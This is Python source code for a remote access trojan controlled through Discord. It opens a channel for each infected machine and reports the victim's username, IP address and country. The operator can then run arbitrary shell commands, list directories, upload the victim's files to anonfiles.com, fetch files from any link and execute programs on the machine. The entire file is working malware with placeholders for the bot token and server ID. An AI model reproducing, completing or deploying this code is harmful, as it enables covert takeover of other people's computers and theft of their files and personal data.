import os
import discord
import subprocess
import requests
import sys
from dotenv import load_dotenv
import getpass

load_dotenv()

login = getpass.getuser()
client = discord.Client(intents=discord.Intents.all())
session_id = os.urandom(8).hex()
guild_id = "GROUP ID"
commands = "\n".join([
    "help - Help command",
    "ping - Ping",
    "cd - Change Directory",
    "ls - List Directorys",
    "download <archive> - Download Archives from Host",
    "upload <link> - Upload Archivies to Host",
    "cmd <command> - Execute CMD",
    "run <archive> - Execute Archive",
])

@client.event
async def on_ready():
    guild = client.get_guild(int(guild_id))
    channel = await guild.create_text_channel(session_id)
    ip_address = requests.get("https://ipapi.co/json/").json()
    data = ip_address['country_name'], ip_address['ip']
    embed = discord.Embed(title="New session created", description="", color=0xfafafa)
    embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
    embed.add_field(name="Username", value=f"```{login}```", inline=True)
    embed.add_field(name="IP Address", value=f"```{data}```", inline=True)
    embed.add_field(name="Commands", value=f"```{commands}```", inline=False)
    await channel.send(embed=embed)

@client.event
async def on_message(message):
    if message.author == client.user:
        return

    if message.channel.name != session_id:
        return

    if message.content == "help":
        embed = discord.Embed(title="Help", description=f"```{commands}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "ping":
        embed = discord.Embed(title="Ping", description=f"```{round(client.latency * 1000)}ms```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("cd"):
        directory = message.content.split(" ")[1]
        try:
            os.chdir(directory)
            embed = discord.Embed(title="Directory changed", description=f"```{os.getcwd()}```", color=0xfafafa)
        except:
            embed = discord.Embed(title="Error", description=f"```Directory not found```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content == "ls":
        files = "\n".join(os.listdir())
        if files == "":
            files = "No Archivies found"
        embed = discord.Embed(title=f"Archivies > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("download"):
        file = message.content.split(" ")[1]
        try:
            link = requests.post("https://api.anonfiles.com/upload", files={"file": open(file, "rb")}).json()["data"]["file"]["url"]["full"]
            embed = discord.Embed(title="Download", description=f"```{link}```", color=0xfafafa)
            await message.reply(embed=embed)
        except:
            embed = discord.Embed(title="Error", description=f"```Archive not found```", color=0xfafafa)
            await message.reply(embed=embed)

    if message.content.startswith("upload"):
        link = message.content.split(" ")[1]
        file = requests.get(link).content
        with open(os.path.basename(link), "wb") as f:
            f.write(file)
        embed = discord.Embed(title="Upload", description=f"```{os.path.basename(link)}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("cmd"):
        command = message.content.split(" ", 1)[1]
        output = subprocess.run(command, shell=True, capture_output=True, text=True)
        if output.returncode == 0:
            response = output.stdout
        else:
            response = output.stderr
        embed = discord.Embed(title=f"Command CMD", description=f"```{response}```", color=0xfafafa)
        await message.reply(embed=embed)

    if message.content.startswith("run"):
        file = message.content.split(" ")[1]
        subprocess.Popen(file, shell=True)
        embed = discord.Embed(title="Executed", description=f"```{file}```", color=0xfafafa)
        await message.reply(embed=embed)

client.run('YOUR BOT TOKEN')
